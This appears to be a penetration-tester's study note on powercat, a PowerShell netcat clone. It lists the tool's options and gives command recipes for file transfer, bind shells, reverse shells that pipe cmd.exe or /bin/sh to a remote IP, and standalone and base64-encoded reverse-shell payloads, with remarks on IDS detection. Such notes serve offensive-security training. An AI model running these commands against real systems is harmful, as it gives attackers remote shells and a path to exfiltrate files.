

[Powershell](OS%20Commands.md#PowerShell) version of [netcat](Tools.md#netcat). Script can be downloaded to Windows host that leverages the strength of PowerShell while simplifying creation of bind/ reverse bind shells.  
  
  
Installation of [powercat](https://github.com/besimorhino/powercat/blob/master/powercat.ps1)
```bash
apt install powercat
```
	on Linux adds the script to _/usr/share/windows-resources/powercat_  
  

**-c** _ip_ - Client connection to given _ip_  
**-d** - Disconnect  
**-e** _process_ - Execute given process  
**-ep** - Start a pseudo powershell session. Can declare variables and execute commands, but if you try to enter a new shell (nslookup, netsh, cmd, etc), it'll hang.  
**-i** - Provide data to be sent down the pipe as soon as a connection is established. Used for moving files. You can provide the path to a file, a byte array object, or a string.  
You can also pipe any of those into powercat:
```bash
'aaaaaa' | powercat -c 10.1.1.1 -p 80
```

**-g** - Generate payload. Returns a script as a string which will execute the powercat w/ the options specified. (**-i**, **-d**, and **-rep** won't be incorporated)  
**-ge** - Generate encoded payload. Same as **-g**, but returns string which can be executed with
```powershell
powershell -E <encoded string>
```
 
**-l** - Listen mode  
**-of** - Output file  
**-p** _port_ - Specify _port_  
**-r** _string_ - Relay network traffic between two nodes  
Client Relay Format:
```bash
-r <protocol>:<ip>:<port>
```

Client Listener Format:
```bash
-r <protocol>:<port>
```
 
DNSCat2 Format:
```bash
-r dns:<dns server>:<dns port>:<domain>
```
  
**-rep** - Repeater. Powercat will automatically restart once disconnected. Used for setting up a persistent server  
**-h** - Help  
  
  
###### File Transfer
to: 
```bash
sudo nc -lvnp 443 > <received_file.ps1>
```

from:  
```powershell
. .\powercat.ps1  
powercat -c <ip> -p 443 -i C:\Users\<path_to_file.ps1>
```  
	Note: There's no indication that the file transferred  



###### Bind Shell:
  
Linux = Victim; Win = Attacker  
```bash
nc -nlvp 443 -e /bin/sh
```
```powershell
powercat -c <ip> -p 443
```


Win = Victim; Linux = Attacker  
```powershell
powercat -l -p 443 -e cmd.exe
```
```bash
nc <ip> 443
```
  

  
###### Reverse Shell:  
  
Linux = Victim; Win = Attacker  
```bash
nc <ip> 443 -e /bin/sh
```
```powershell
powercat -l -p 443
```


Win = Victim; Linux = Attacker  
```powershell
powercat -c <ip> -p 443 -e cmd.exe
```
```bash
nc -nlvp 443
```

  
  
###### Payloads:  
Set of powershell instructions as well as the portion of the powercat script itself that only includes the features requested by the user.  
  
```powershell
powercat -c <ip> -p 443 -e cmd.exe -g > reverseshell.ps1
```

Note: Stand-alone payloads like this one might be easily detected by IDS.  
Specifically, the script that is generated is rather large with roughly 300 lines of code and contains a number of hardcoded strings that can easily be used in signatures for malicious activity.  
Plaintext malicious code such as this will likely have a poor success rate and will likely be caught by defensive software solutions.  
  
  
###### Encrypted Payloads: 
```powershell
powercat -c <ip> -p 443 -e cmd.exe -ge > encryptedreverse.ps1
```

Run script w/  
```powershell
powershell -E (Get-Content 'myscript.ps1' -Raw)
```